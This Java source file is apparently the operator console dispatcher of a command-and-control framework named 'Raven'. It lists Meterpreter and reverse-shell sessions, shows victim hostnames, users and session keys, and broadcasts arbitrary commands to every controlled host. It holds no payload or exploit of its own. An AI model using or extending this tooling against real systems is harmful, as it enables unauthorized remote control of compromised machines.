package com.raven.interfaces.GUI.module.core.server;

import com.raven.core.command.AgentCommandDispatcher;
import com.raven.core.command.AgentCommandDispatcher.CommandResult;
import com.raven.core.command.CommandRegistry;
import com.raven.core.command.CommandRegistry.Category;
import com.raven.core.command.CommandRegistry.CommandDef;
import com.raven.core.database.TeamDatabase;
import com.raven.core.server.RavenServer;
import com.raven.interfaces.GUI.module.core.session.SessionManager;
import java.util.List;
import java.util.Map;
import java.util.function.Consumer;
import javafx.application.Platform;
import javafx.scene.control.TextField;

public final class CommandDispatcher {

    private final RavenServer Server;
    private final TeamDatabase Database;
    private final SessionManager SessionManager;
    private final Consumer<String> Log;
    private final String Operator;
    private final AgentCommandDispatcher AgentDispatcher;

    public CommandDispatcher(RavenServer Server, TeamDatabase Database, SessionManager SessionManager, Consumer<String> Log, String Operator) {
        this.Server = Server;
        this.Database = Database;
        this.SessionManager = SessionManager;
        this.Log = Log;
        this.Operator = Operator;
        this.AgentDispatcher = new AgentCommandDispatcher(Server, Database, Operator);
    }

    public void Dispatch(String Input, TextField InputField) {
        if (Input == null || Input.isBlank()) return;

        if (Server == null || !Server.IsRunning()) {
            Log.accept("[!] Server not running");
            return;
        }

        String[] Parts = Input.trim().split("\\s+", 3);
        String Command = Parts[0].toLowerCase();

        switch (Command) {
            case "help" -> ShowHelp();
            case "clear" -> Log.accept("\033[2J\033[H");
            case "sessions", "agents" -> ShowSessions();
            case "stats" -> ShowStats();
            case "status" -> ShowStatus();
            case "tasks" -> Log.accept("Active sessions: " + Server.GetSessions().Count());
            case "broadcast" -> {
                if (Parts.length < 3) {
                    Log.accept("[!] " + Usage("broadcast"));
                    break;
                }
                String Target = Parts[1].toLowerCase();
                String Command2 = Parts[2];
                if (Target.equals("all")) {
                    Map<Integer, CommandResult> Results = AgentDispatcher.BroadcastAllDispatch(Command2);
                    Results.forEach((Identifier, Result) -> Log.accept("  [session-" + Identifier + "] " + (Result.Success() ? "✔" : "✘") + " " + Result.Output()));
                } else {
                    List<Integer> Ids = ParseIds(Target);
                    if (Ids.isEmpty()) {
                        Log.accept("[!] No valid session IDs");
                        break;
                    }
                    Map<Integer, CommandResult> Results = AgentDispatcher.BroadcastDispatch(Ids, Command2);
                    Results.forEach((Identifier, Result) -> Log.accept("  [session-" + Identifier + "] " + (Result.Success() ? "✔" : "✘") + " " + Result.Output()));
                }
                Platform.runLater(SessionManager::Refresh);
            }
            case "kill" -> {
                if (Parts.length < 2) {
                    Log.accept("[!] " + Usage("kill"));
                    break;
                }
                try {
                    int Identifier = Integer.parseInt(Parts[1].trim());
                    Server.RemoveSession(Identifier);
                    Log.accept("[+] session-" + Identifier + " terminated");
                    Platform.runLater(SessionManager::Refresh);
                } catch (NumberFormatException Exception) {
                    Log.accept("[!] Invalid session ID");
                }
            }
            case "sysinfo", "info" -> {
                if (Parts.length < 2) {
                    Log.accept("[!] " + Usage("sysinfo"));
                    break;
                }
                try {
                    var SessionOpt = Server.GetSessions().Get(Integer.parseInt(Parts[1].trim()));
                    if (SessionOpt.isEmpty()) {
                        Log.accept("[!] Session not found");
                        break;
                    }
                    var ActiveSession = SessionOpt.get();
                    Log.accept("ID       : " + ActiveSession.GetId() + "  Name: " + ActiveSession.GetDisplayName());
                    Log.accept("Type     : " + ActiveSession.GetSessionType().name());
                    Log.accept("Hostname : " + ActiveSession.GetHostname() + "  User: " + ActiveSession.GetUser());
                    Log.accept("OS       : " + ActiveSession.GetOs() + "  Arch: " + ActiveSession.GetArch());
                    Log.accept("IP       : " + ActiveSession.GetAgentIp() + "  Key: " + ActiveSession.GetSessionKey());
                    Log.accept("Enc      : " + ActiveSession.IsEncrypted() + "  mTLS: " + ActiveSession.IsMtlsEnabled());
                    Log.accept("Note     : " + Database.GetAgentNote(ActiveSession.GetId()));
                } catch (NumberFormatException Exception) {
                    Log.accept("[!] Invalid session ID");
                }
            }
            case "note" -> {
                if (Parts.length < 3) {
                    Log.accept("[!] " + Usage("note"));
                    break;
                }
                try {
                    int Identifier = Integer.parseInt(Parts[1].trim());
                    Database.SetAgentNote(Identifier, Parts[2]);
                    Log.accept("[+] Note saved for session-" + Identifier);
                } catch (NumberFormatException Exception) {
                    Log.accept("[!] Invalid session ID");
                }
            }
            case "getnote" -> {
                if (Parts.length < 2) {
                    Log.accept("[!] " + Usage("getnote"));
                    break;
                }
                try {
                    int Identifier = Integer.parseInt(Parts[1].trim());
                    String Note = Database.GetAgentNote(Identifier);
                    Log.accept("Note [session-" + Identifier + "]: " + (Note.isBlank() ? "(empty)" : Note));
                } catch (NumberFormatException Exception) {
                    Log.accept("[!] Invalid session ID");
                }
            }
            case "history" -> {
                int AgentId = Parts.length > 1 ? ParseIntSafe(Parts[1], 0) : 0;
                int Limit = Parts.length > 2 ? ParseIntSafe(Parts[2], 25) : 25;
                List<Map<String, Object>> History = Database.GetCommandHistory(AgentId, Limit);
                Log.accept("History (" + History.size() + " entries):");
                History.forEach(Row -> Log.accept("  #" + Row.getOrDefault("AgentId", "?") + "  " + Row.getOrDefault("Operator", "?") + "  " + Row.getOrDefault("Command", "") + "  [" + Row.getOrDefault("Timestamp", "") + "]"));
            }
            default -> {
                if (Parts.length < 2) {
                    Log.accept("[!] Usage: <command> <session-id> [args]");
                    Log.accept("    Type 'help' for all commands");
                    break;
                }
                try {
                    int SessionId = Integer.parseInt(Parts[1].trim());
                    String Arguments = Parts.length > 2 ? Parts[2] : "";
                    String FullInput = Arguments.isBlank() ? Command : Command + " " + Arguments;
                    CommandResult Result = AgentDispatcher.Dispatch(SessionId, FullInput);
                    Log.accept(Result.Success() ? Result.Output() : "[!] " + Result.Output());
                    Platform.runLater(SessionManager::Refresh);
                } catch (NumberFormatException Exception) {
                    Log.accept("[!] Unknown command: " + Command + " — type 'help' for reference");
                }
            }
        }

        if (InputField != null) Platform.runLater(InputField::clear);
    }

    private void ShowHelp() {
        Log.accept("══════════════════════════════════════════");
        Log.accept(" RAVEN COMMAND REFERENCE");
        Log.accept("══════════════════════════════════════════");
        for (Category CategoryValue : Category.values()) {
            List<CommandDef> Commands = CommandRegistry.ByCategory(CategoryValue);
            if (Commands.isEmpty()) continue;
            Log.accept("");
            Log.accept("  [ " + CategoryValue.name() + " ]");
            for (CommandDef Definition : Commands) Log.accept("    " + padRight(Definition.Usage(), 44) + "  " + Definition.Description());
        }
        Log.accept("");
    }

    private void ShowSessions() {
        int Count = Server.GetSessions().Count();
        Log.accept("Active sessions (" + Count + "):");
        Server.GetSessions()
            .GetAll()
            .forEach(ActiveSession -> Log.accept("  #" + ActiveSession.GetId() + "  " + ActiveSession.GetDisplayName() + "  " + ActiveSession.GetUser() + "@" + ActiveSession.GetHostname() + "  " + ActiveSession.GetOs() + "  key=" + ActiveSession.GetSessionKey()));
        Platform.runLater(SessionManager::Refresh);
    }

    private void ShowStats() {
        Map<String, Integer> Stats = Server.GetSessions().GetStats();
        Log.accept("Total        : " + Stats.get("Total"));
        Log.accept("RAVEN        : " + Stats.get("RAVEN"));
        Log.accept("Meterpreter  : " + Stats.get("METERPRETER"));
        Log.accept("Reverse Shell: " + Stats.get("REVERSE_SHELL"));
    }

    private void ShowStatus() {
        Log.accept("Status   : " + (Server.IsRunning() ? "ONLINE" : "OFFLINE"));
        Log.accept("Mode     : " + Server.GetMode().name());
        Log.accept("Address  : " + Server.GetHost() + ":" + Server.GetPort());
        Log.accept("Sessions : " + Server.GetSessions().Count());
        Log.accept("Key      : " + Server.GetKeyBase64());
    }

    private String Usage(String Command) {
        CommandDef Definition = CommandRegistry.Get(Command);
        return Definition != null ? "Usage: " + Definition.Usage() : "Usage: " + Command;
    }

    private static List<Integer> ParseIds(String Input) {
        List<Integer> Ids = new java.util.ArrayList<>();
        for (String Part : Input.split(","))
            try {
                Ids.add(Integer.parseInt(Part.trim()));
            } catch (Exception Ignored) {}
        return Ids;
    }

    private static int ParseIntSafe(String Input, int Default) {
        try {
            return Integer.parseInt(Input.trim());
        } catch (Exception Ignored) {
            return Default;
        }
    }

    private static String padRight(String Input, int Width) {
        return Input.length() >= Width ? Input : Input + " ".repeat(Width - Input.length());
    }
}
